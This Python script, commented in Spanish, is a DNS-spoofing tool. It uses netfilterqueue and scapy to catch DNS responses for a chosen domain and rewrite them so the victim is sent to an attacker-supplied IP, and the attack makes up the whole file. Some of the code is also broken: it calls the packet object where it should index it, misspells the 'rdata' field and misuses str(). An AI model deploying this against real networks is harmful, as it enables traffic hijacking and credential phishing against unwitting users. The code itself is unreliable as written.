import netfilterqueue
import scapy.all as scapy
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-w', '--domain', dest= 'domain', help= 'Ingresar nombre del sitio web que se quiere redireccionar')
    parser.add_option('-r', '--redirectip', dest= 'redirectIp', help= 'Ip del sitio web de donde se va a hacer la redirección DNS')
    (options, arguments) = parser.parse_args()
    return options

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload()) #Obtiene toda la información del paquete

    #Filtra los paquetes DNS Response Record
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket(scapy.DNSQR).qname #Obtenemos el nombre del sitio web al que ha accedido la víctima
        options = getArguments()

        #Realiza el DNS Spoof si la víctima ha accedido a la página deseada
        if options.domain in qname:
            print('[+] Spoofing target')
            #Para spoofear a la víctima debemos modificar el "rrname" y el "rdata" ubicado en "DNS Resource Record"
            answer = scapy.DNSRR(rname= qname, rrdata= options.redirectIp)
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1 #Es necesario que los contadores de respuesta(ancount) sean igual a "1"
            
            #Ahora se debe eliminar los parámetros "len" y "chksum" de las capas "UPD" y "IP"
            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum

            #Todas las modificaciones que hemos realizado, las pasamos al paquete original para que el Spoof se realice
            packet.set_payload(str(scapyPacket))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()
